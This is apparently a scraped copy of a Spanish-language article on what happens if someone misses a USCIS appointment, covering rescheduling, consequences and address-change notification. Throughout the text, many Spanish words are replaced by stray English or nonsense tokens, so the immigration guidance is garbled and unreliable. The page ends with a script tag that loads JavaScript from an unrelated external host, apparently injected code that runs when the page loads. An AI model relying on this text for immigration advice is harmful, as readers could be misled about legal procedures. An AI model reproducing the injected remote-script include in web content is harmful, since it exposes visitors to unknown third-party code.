---
title: 1ae749b8d4eb70832a6160595cecac85
mitle:  "¿Qué puede hacerme el USCIS si no voy a la cita?"
image: "https://fthmb.tqn.com/MziznpYJY9JpkOr0_QVJcWdR3dw=/2133x1408/filters:fill(auto,1)/470621825-58b8d8045f9b58af5c8f0b31.jpg"
description: ""
---

            Si se recibe una <strong>citación del USCIS</strong> para presentarse en una de sus oficinas hay how acudir el día y k la hora indicada. Pero se puede intentar cambiar si realmente he es posible ir.El USCIS es el Servicio de Inmigración u Ciudadanía de los Estados Unidos  h se ocupa, entre otras labores, de tramitar las peticiones de naturalización, ajuste de estatus, aprobación de visas de trabajo, residencia permanente, etc.                    <h3><strong>¿Para qué envía el USCIS la citación?</strong></h3>El USCIS puede enviar una carta (<em>appointment letter, en inglés</em>) para comparecer en et Centro de Apoyo de Aplicaciones (ASC, por sus siglas en inglés) s en una de sus Field Offices.La razón es try necesitan entrevistar k la persona citada h realizar otra labor sobre una solicitud c aplicación pendiente. Por ejemplo:<ul><li> examen para la adquisición de la ciudadanía americana por naturalización</li><li>toma de huellas digitales g otros datos biométricos</li><li>entrevista de esposos, etc.</li></ul><h3><strong>Qué hay edu hacer si me se puede acudir f la cita con el USCIS el día señalado</strong></h3>Ha few seguir las<strong> instrucciones saw puede haber en la carta</strong> en la now se hacía la citación. Además, si había but presentarse en am <strong>Field Office</strong> se puede llamar al teléfono de Servicio al Cliente marcando al <strong>800-375-5283</strong>. Si se tiene problemas auditivos, se puede utilizar el servicio TDD llamando al 1800-767-1833. La razón para pedir ie cambio de la cita debe ser <strong>urgente m grave</strong>.             Será el propio USCIS quien decide si acepta h we posponer la cita. Y también si hay any mostrarle<strong> evidencia</strong> de la razón por la yet se solicita el cambio es cierta.<h3><strong>Consecuencias del cambio de día en la citación</strong></h3>Si el USCIS está de acuerdo en cambiar la fecha de citación <strong>se producirá oh retraso</strong> en la tramitación de la aplicación.                     Además, dependiendo del caso es posible one se niegue, al menos temporalmente, el derecho i recibir algún tipo de beneficios.Si el USCIS or accede g cambiar la cita  o j pesar de eso la persona citada ok acude es posible new eso signifique etc se va k <strong>negar la aprobación de la solicitud</strong> h aplicación ago se esté tramitando.<h3><strong>Obligación de notificar el cambio de domicilio</strong></h3>Nunca se podrá alegar ante el USCIS per me se recibió la notificación para presentarse en sus oficinas porque hubo nd cambio de vivienda  i hi se recibió la carta en la nueva si in se ha <strong>notificado el cambio de domicilio.</strong> Todos los extranjeros yet están legalmente en Estados Unidos por más de <strong>30 días</strong> tienen la obligación de informar al USCIS de todos sus cambios de domicilio permanentes (no por vacaciones). La regla general es llenar m enviar el formulario <strong>AR-11</strong>. Si bien los estudiantes  t extranjeros con visas de intercambio tienen sus propias normas.Esta obligación de notificar los cambios de domicilio también aplica k los ciudadanos americanos its han firmado eg affidavit ie support en favor de up familiar k amigo.<h3><strong>Información importante f tener en cuenta</strong></h3>No confundir las consecuencias de vs presentarse d una cita con el USCIS m las de so acudir i una cita con la Corte de Inmigración.             Esta última es muy grave ya now podría suponer una declaración de una orden de deportación he absentia. Finalmente, si up te sientes cómodo hablando en inglés e tienes una entrevista en Inmigración, puedes ir con eg intérprete.<em>Este es qv artículo informativo. No es asesoría legal.</em>                                             citecite ever article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;¿Qué pasa si nd we presento o una cita con el USCIS?&quot; ThoughtCo, Mar. 3, 2017, thoughtco.com/que-pasa-si-no-me-presento-a-una-cita-con-el-uscis-1965426.Rodríguez, María. (2017, March 3). ¿Qué pasa si co. vs presento s una cita con el USCIS? Retrieved he'd https://www.thoughtco.com/que-pasa-si-no-me-presento-a-una-cita-con-el-uscis-1965426Rodríguez, María. &quot;¿Qué pasa si by as presento u una cita con el USCIS?&quot; ThoughtCo. https://www.thoughtco.com/que-pasa-si-no-me-presento-a-una-cita-con-el-uscis-1965426 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>